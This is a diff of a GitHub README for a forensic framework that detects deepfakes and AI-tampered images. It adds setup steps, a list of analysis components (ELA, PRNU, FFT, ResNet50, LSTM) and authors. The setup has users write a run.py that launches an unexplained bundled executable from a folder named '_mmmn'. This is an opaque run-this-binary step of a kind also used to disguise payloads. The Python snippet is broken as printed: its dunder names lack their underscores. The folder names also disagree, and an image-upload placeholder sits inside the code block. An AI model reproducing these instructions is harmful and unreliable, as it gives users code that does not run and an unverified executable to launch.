@@ -25,7 +25,75 @@ To run or understand this framework, the following are recommended:
 
 ### Installation
 1. Clone the repository:
-   ```bash
+   ```bash![Uploading Kamisato Ayaka Unofficial Art by @Bibimbub15.jpg…]()
+
    [git clone https://github.com/your-username/your-repository-name.git](https://github.com/zanzers/UnifiedForensicAnalyze.git)
 
 
+after you clone it 
+Navigate to the project directory cd your-repository-name
+Then Install required requirements pip install -r requirements.txt
+Then in that folder, create a folder named Updoad, thats where you'll upload the image or video
+Then create a python file name run.py(any name will do) then add this to that python file:
+
+import subprocess
+import os
+
+
+def run_command(command):
+    try:
+        exe_path = os.path.join(
+            os.path.dirname(os.path.abspath(_file_)),
+            "_mmmn",
+            "UnifiedForensicAnalyze.exe"
+        )
+
+        subprocess.run([exe_path, command], check=True)
+
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+
+
+
+if _name_ == "_main_":
+    input_path = os.path.join(
+        os.path.dirname(os.path.abspath(_file_)),
+        "uploads"
+    )
+    run_command(input_path)
+
+Once executed, the framework will automatically process the uploaded image or video on the upload folder you put.
+
+
+## Usage
+This framework can be used to
+- Train and evaluate models for AI-tampered image and deepfakes detection
+- Detect deepfake videos and AI-tampered image 
+- Analyze suspicious segments within video sequences
+- Support academic research in digital forensics and media integrity
+
+## Dataflow
+<img width="1920" height="2020" alt="dataflow" src="https://github.com/user-attachments/assets/adf1e760-c287-451d-b4d7-8e7277927f31" />
+
+## Framework Overview
+The proposed framework consists of the following components:
+### Image-Level Forensic Analysis
+- Error Level Analysis (ELA)
+- Photo-Response Non-Uniformity (PRNU)
+- Fast Fourier Transform (FFT)
+- ResNet50-based feature extraction
+### Video-Level Forensic Analysis
+- ResNet50-based feature extraction
+- CNN-based spatial feature extraction
+- LSTM-based temporal feature modeling
+- Sliding window aggregation for video classification
+### Decision Layer
+- Final authenticity classification
+- Suspicious segment localization
+
+## Authors
+- Manzano, Marcelo R. Jr.
+- Saavedra, Nowell T.
+- Solidum, Marc Eric P.
+- Villareal, Janmark Czar
